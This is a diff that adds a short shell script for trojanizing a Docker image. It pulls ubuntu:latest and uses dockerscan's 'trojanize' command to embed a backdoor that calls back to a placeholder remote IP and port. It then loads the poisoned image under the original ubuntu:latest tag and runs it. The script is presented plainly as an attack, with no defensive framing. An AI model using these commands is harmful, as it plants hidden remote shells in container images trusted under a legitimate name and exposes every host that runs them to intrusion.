@@ -1,0 +1,7 @@
+docker pull ubuntu:latest && docker save ubuntu:latest -o ubuntu-original
+export LC_ALL=C.UTF-8
+export LANG=C.UTF-8
+dockerscan image modify trojanize ubuntu-original -l <REMOTE_MACHINE_IP> -p <PORT> -o ubuntu-original-trojanized
+
+docker load -i ubuntu-original-trojanized.tar
+docker run -it ubuntu:latest /bin/bash
